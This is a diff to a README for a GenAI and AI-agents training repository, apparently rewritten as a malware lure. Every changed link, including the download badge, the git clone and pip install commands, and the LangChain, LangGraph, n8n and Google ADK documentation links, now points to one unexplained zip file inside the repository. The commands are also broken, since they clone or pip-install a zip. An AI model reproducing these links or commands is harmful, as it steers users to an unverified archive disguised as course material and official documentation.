@@ -1,6 +1,6 @@
 # Hands-On Training for GenAI and AI Agents at Sathyabama 🌟
 
-[![Download Releases](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases%20Releases-Click%20Here-brightgreen)](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
+[![Download Releases](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
 
 ## Table of Contents
 
@@ -48,7 +48,7 @@ Before attending the training, participants should have:
 To get started, clone this repository using the following command:
 
 ```bash
-git clone https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases
+git clone https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip
 ```
 
 After cloning, navigate to the project directory:
@@ -62,7 +62,7 @@ cd sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents
 Make sure you have Python 3.x installed. You can install the required packages using pip:
 
 ```bash
-pip install -r https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases
+pip install -r https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip
 ```
 
 ## Training Schedule
@@ -109,10 +109,10 @@ Throughout the training, participants will engage in several hands-on projects, 
 
 ### Documentation
 
-- [LangChain Documentation](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
-- [LangGraph Documentation](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
-- [n8n Documentation](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
-- [Google ADK Documentation](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
+- [LangChain Documentation](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
+- [LangGraph Documentation](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
+- [n8n Documentation](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
+- [Google ADK Documentation](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
 
 ### Sample Code
 
@@ -133,6 +133,6 @@ Contributions are welcome! If you have suggestions for improvements or new featu
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-For the latest updates and releases, check the [Releases section](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases). 
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip). 
 
-[![Download Releases](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases%20Releases-Click%20Here-brightgreen)](https://github.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/releases)
+[![Download Releases](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Dilshodbek329-create/sathyabama-july-2025-hands-on-professional-training-on-genai-and-ai-agents/main/doctorless/genai_agents_hands_on_ai_training_and_professional_sathyabama_july_v3.6.zip)
